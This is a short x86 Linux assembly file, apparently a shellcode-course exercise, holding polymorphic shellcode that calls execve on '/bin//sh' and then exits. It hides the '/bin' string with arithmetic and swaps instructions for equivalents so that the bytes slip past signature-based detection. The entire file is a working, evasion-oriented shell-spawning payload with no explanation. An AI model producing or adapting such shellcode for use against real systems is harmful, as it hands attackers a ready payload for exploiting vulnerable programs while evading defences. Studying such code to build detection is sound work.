; Filename: exec-polymorphic.nasm
; Author: SLAE-14209

global _start           

section .text

_start:
     
      ;xor eax, eax
      sub eax, eax
      push eax
      push 0x68732f2f
      ;push 0x6e69622f
      add eax, 0x5d58511e
      add eax, 0x11111111
      push eax
      xor eax, eax
      ;mov ebx, esp
      push esp
      pop ebx
      ;mov ecx, eax
      push eax
      pop ecx
      mov edx, eax
      mov al, 0xb
      int 0x80
      
      ;xor eax, eax
      sub eax, eax
      inc eax
      int 0x80
